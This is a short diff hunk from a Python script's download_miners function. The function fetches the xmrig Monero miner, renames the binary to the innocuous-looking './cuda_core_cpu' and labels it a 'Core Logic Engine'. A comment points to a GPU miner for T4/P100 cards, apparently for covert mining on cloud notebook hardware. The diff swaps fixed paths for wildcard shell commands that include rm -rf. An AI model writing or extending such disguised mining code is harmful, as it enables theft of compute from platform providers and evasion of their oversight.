@@ -138,8 +138,9 @@ def download_miners():
         print("  -> [1/2] Downloading Core Logic Engine (CPU)...", flush=True)
         subprocess.run(["wget", "-q", "--show-progress", "https://github.com/MoneroOcean/xmrig/releases/download/v6.22.2-mo1/xmrig-v6.22.2-mo1-lin64-compat.tar.gz", "-O", "cpu.tar.gz"])
         subprocess.run(["tar", "-xzf", "cpu.tar.gz"])
-        subprocess.run(["mv", "xmrig-v6.22.2-mo1/xmrig", "./cuda_core_cpu"])
-        subprocess.run(["rm", "-rf", "cpu.tar.gz", "xmrig-v6.22.2-mo1"])
+        # Use a wildcard to handle dynamic folder names from tar extraction
+        subprocess.run("mv xmrig-*/xmrig ./cuda_core_cpu", shell=True)
+        subprocess.run("rm -rf cpu.tar.gz xmrig-*", shell=True)
         subprocess.run(["chmod", "+x", "./cuda_core_cpu"])
 
     # GPU Miner (NBMiner - Excellent for T4/P100)
